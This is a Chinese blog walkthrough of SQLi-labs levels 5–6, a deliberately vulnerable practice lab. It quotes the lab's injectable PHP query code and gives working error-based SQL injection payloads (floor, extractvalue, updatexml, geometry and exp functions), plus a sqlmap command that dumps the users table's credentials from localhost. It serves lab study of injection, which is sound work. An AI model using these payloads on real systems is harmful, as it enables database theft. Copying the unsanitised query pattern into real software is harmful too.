---
 title: Sqlilabs通关笔记(5-6)报错注入
 date: 2020-01-03 15:40:47
 tags: SQL注入
 categories:
---

## 第五关 基于GET单引号双注入
![2020-1-3-15-50-34-Sqlilabs通关笔记(4-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-15-50-34-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(4-10))

<!--more-->
### 存在注入点判断

1. 输入单引号测试，有报错信息，返回信息和第一关错误信息一样

2. 不管输入id为多少，页面一直都是 you are in ....猜测正确的页面不变，不会将查询结果打印到页面了，查看源码发现，确实是不输出结果了

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
```
**但是会把错误的信息给打印出来**
3. 所以应该用到双注入（也称报错注入），在错误中把要的信息打印出来

### 报错注入方式（十种）
该注入原理可以查找资料，注入方式的有[资料](https://www.cnblogs.com/csyxf/p/10241456.html)可以点击查看，如下只列举常遇到的十种报错注入的方式

- **floor函数注入** 

    * 函数介绍
        - count():查询数量
        - rand()：产生0~1间的随机数
        - floor()：向下取整
        - group by：按指定分类

    * 写法
    > select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

    * 运用
    >  http://localhost/sqlilabs2/Less-5/index.php?id=-1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23

    ![2020-1-3-16-33-7-Sqlilabs通关笔记(4-10)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-16-33-7-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(4-10)) 

    * 使用注意
        - payload是在中间concat部分，修改该部分可以执行不同命令
        - 只能用concat连接 ，group_concat不行，且每次只能显示一条数据
        - 要让上述的报错实现，数据库至少要3条数据

- **extractvalue函数注入**
    * 函数介绍
		- 对XML文档进行查询
		- EXTRACTVALUE (XML_document, XPath_string);
		- 第一个参数：XML_document是String格式，为XML文档对象的名称
		- 第二个参数：XPath_string (Xpath格式的字符串)
		- 作用：从目标XML中返回包含所查询值的字符串
    * 写法
		> select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
    * 运用
		>  http://localhost/sqlilabs2/Less-5/index.php?id=-1' and (extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)))--+
	![2020-1-3-17-0-10-Sqlilabs通关笔记(5-6)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-17-0-10-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(5-6))
    * 使用注意
		- MySQL 5.1.5版本以上才支持该函数
		- 返回的数据限制为32位
		- 可以用substring函数进行数据位移偏转
			>  http://localhost/sqlilabs2/Less-5/index.php?id=-1' and (extractvalue(1,concat(0x7e,(select substring(group_concat(username),1) from users),0x7e)))--+

- **updatexml函数注入**
    * 函数介绍
		- 对XML文档进行修改
		- UPDATEXML (XML_document, XPath_string, new_value);
		- 第一个参数：XML_document是String格式，为XML文档对象的名称
		- 第二个参数：XPath_string (Xpath格式的字符串)
		- 第三个参数：new_value，String格式，替换查找到的符合条件的数据
		- 作用：改变文档中符合条件的节点的值
    * 写法
		> select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
    * 运用
		>  http://localhost/sqlilabs2/Less-5/index.php?id=-1' and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1))--+
	![2020-1-3-17-17-6-Sqlilabs通关笔记(5-6)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-17-17-6-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(5-6))
    * 使用注意
		- MySQL 5.1.5版本以上才支持该函数
		- 返回的数据限制为32位
		- 可以用substring函数进行数据位移偏转

- **geometrycollection函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **multipoint函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **polygon函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **multipolygon函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **linestring函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **multilinestring函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
    * 运用
    * 使用注意

- **exp函数注入**
    * 函数介绍
    * 写法
		> select * from test where id=1 and exp(~(select * from(select user())a));
    * 运用
    * 使用注意

## 第六关 基于GET双引号双注入 
和第五关类似，只要用双引号闭合即可
> http://127.0.0.1/sqlilabs2/Less-6/index.php?id=-1" union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23

![2020-1-4-9-34-1-Sqlilabs通关笔记(5-6)报错注入](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-4-9-34-1-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(5-6)%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

### SQLMAP注入

直接上payload（第五六题均可用）
```
sqlmap -u "http://127.0.0.1/sqlilabs2/Less-5/index.php?id=1" --technique E -D security -T users --dump --batch
```

![2020-1-3-17-23-39-Sqlilabs通关笔记(1-4)](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-3-17-23-39-Sqlilabs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(1-4))